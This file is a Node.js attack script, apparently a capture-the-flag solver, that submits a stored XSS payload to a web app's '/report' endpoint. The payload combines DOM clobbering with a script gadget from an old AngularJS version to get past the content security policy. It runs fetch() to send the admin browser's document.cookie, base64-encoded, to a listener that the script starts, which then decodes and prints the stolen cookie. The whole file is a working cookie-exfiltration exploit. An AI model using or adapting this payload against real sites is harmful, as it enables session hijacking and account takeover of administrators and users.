const axios = require('axios');
const express = require("express");
const qs = require('querystring');
const app = express();
var argv = require('minimist')(process.argv.slice(2));

console.log('Usage: -b [base_url with no trailing \\] -p port -u [local server url with no trailing \\]');

const baseUrl = argv.b || "http://localhost:3001";
const serverUrl = argv.u || 'http://localhost:8888';
const port = argv.p || 8888;

let payload = { report: `<a id="plugins"></a>
<a id="plugins" name="url" href="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></a>
<div ng-app ng-csp>{{$eval.constructor('fetch(\\'${serverUrl}/\\' + btoa(document.cookie), { mode: \\'no-cors\\' })')()}}</div>`};

// Send messages to the admin
async function sendAdminMessage() {
    console.log("Sending message to admin...");
    try {
        const response = await axios.post(baseUrl + '/report', qs.stringify(payload), {
            headers: {'Content-Type': 'application/x-www-form-urlencoded'}
        });
        return response;
    } catch (err) {
        console.error(err);
    }
}

async function doStuffAsync() {
    await sendAdminMessage();
}

app.get("/:value", (req, res) => {
    console.log('--Got response from admin browser for ' + req.params.value);
    console.log('--Decoded', Buffer.from(req.params.value, 'base64').toString());
    process.exit(0);
});

app.listen(port, () => console.log(`Solver server listening on port ${port}`));

doStuffAsync()